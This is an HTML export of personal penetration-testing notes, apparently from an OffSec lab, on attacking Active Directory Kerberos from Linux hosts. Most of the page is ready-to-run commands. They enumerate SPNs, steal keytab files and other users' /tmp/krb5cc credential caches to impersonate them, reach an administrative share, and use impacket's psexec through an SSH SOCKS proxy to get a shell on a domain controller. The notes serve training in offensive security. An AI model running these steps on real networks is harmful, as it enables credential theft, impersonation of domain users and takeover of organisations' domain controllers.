<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>kerberos on linux</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>kerberos on linux</h1><br/><p><h2>Intro</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Linux clients can authenticate to Active Directory servers via Kerberos as a Windows machine would</span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> administrator@<span style="color:#7f0044;font-weight:400">$domain</span>@linuxvictim<br /><span style="color:#0088ff;font-weight:400">##find the administrator’s credential cache file </span><br /><span style="color:#0088ff;font-weight:400">### Active Directory members using Kerberos authentication are assigned a credential cache file to contain their requested Kerberos tickets</span><br /><span style="color:#ff9d00;font-weight:700">env</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> KRB5CCNAME<br />kinit<br />klist<br /><span style="color:#0088ff;font-weight:400">## kerberos get a list of available Service Principal Names (SPN) from the domain controller using ldapsearch with the -Y GSSAPI parameter to force it to use Kerberos authentication</span><br />ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D <span style="color:#3ad900;font-weight:400">&quot;Administrator@CORP1.COM&quot;</span> -W -b <span style="color:#3ad900;font-weight:400">&quot;dc=corp1,dc=com&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;servicePrincipalName=*&quot;</span> servicePrincipalName<br /><span style="color:#0088ff;font-weight:400">## request a service ticket from Kerberos for the MSSQL SPN</span><br />kvno MSSQLSvc/DC01.corp1.com:1433<br />klist<br /></pre></div></p><p></p><p></p><p><h2>Stealing keytab files</h2><ul><li>• <small>• way to allow automated scripts to allow kerberos-enabled network services</small></li><li><small>Keytab files are commonly used in cron scripts when Kerberos authentication is needed to access certain resources</small></li><li><small>Keytab files contain a Kerberos principal name and encrypted keys</small><ul><li><small>allow a user or script to authenticate to Kerberos resources elsewhere on the network on the principal’s behalf without entering a password</small></li></ul></li><li><small>automate kerberos-enabled network actions </small></li><li><small>common on cron </small></li><li><small>• </small>• if root you can access keytab file of domain users and thus request access as them</li><li>mostly located in home folder <ul><li></li></ul></li></ul><div class="codebox"><pre>kinit administrator@corp1.com -t /tmp/administrator.keytab<br />klist<br />kinit -R <span style="color:#0088ff;font-weight:400">## renew ticket</span><br /><br /><span style="color:#0088ff;font-weight:400">## access DC </span><br />smbclient -k -U <span style="color:#3ad900;font-weight:400">&quot;CORP1.com\administrator&quot;</span> //DC01.CORP1.com/C$</pre></div></p><p></p><p></p><p></p><p><h2>Attacking using credential cache files (ccahe)</h2></p><p><ul><li>stored in /tmp/krb5cc_&lt;randomstring&gt;</p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">env</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> KRB5CCNAME <span style="color:#0088ff;font-weight:400"># for your users</span><br /><span style="color:#ff9d00;font-weight:700">ls</span> -al /tmp/krb5cc_* <span style="color:#0088ff;font-weight:400"># steal other cache files</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow<br /><span style="color:#ff9d00;font-weight:700">sudo</span> chown offsec:offsec /tmp/krb5cc_minenow<br />kdestroy<br />klist<br /><span style="color:#ff9d00;font-weight:700">export</span> <span style="color:#7f0044;font-weight:400">KRB5CCNAME</span>=/tmp/krb5cc_minenow<br />klist<br />kvno MSSQLSvc/DC01.corp1.com:1433<br />klist</pre></div></p><p></p><p></p><p></p><p><h2>attacking with impacket</h2></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">sudo</span> apt install krb5-user<br /><span style="color:#0088ff;font-weight:400">## When prompted for a kerberos realm, we&#39;ll enter &quot;corp1.com</span><br />host corp1.com<br /><span style="color:#0088ff;font-weight:400">## edit proxychains.conf and disable proxy_dns</span><br /><span style="color:#0088ff;font-weight:400">#proxy_dns </span><br /><span style="color:#0088ff;font-weight:400">## set up a SOCKS server using ssh on the server</span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> offsec@linuxvictim -D 9050<br /><span style="color:#0088ff;font-weight:400">## impacket </span><br /><span style="color:#0088ff;font-weight:400">### get users </span><br />GetADUsers.py -all -k -no-pass -dc-ip <span style="color:#7f0044;font-weight:400">$dc</span> complyedge.com/pete<br /><span style="color:#0088ff;font-weight:400">### list spns </span><br />GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator<br /><br /><span style="color:#0088ff;font-weight:400">### gain shell on server </span><br />psexec.py Administrator@DC01.CORP1.COM -k -no-pass<br /> psexec.py -k -no-pass -target-ip 172.16.161.168 -dc-ip 172.16.161.168 dmzdc01.complyedge.com</pre></div></p><p></p><p></p><p></p></div>
</body>
</html>
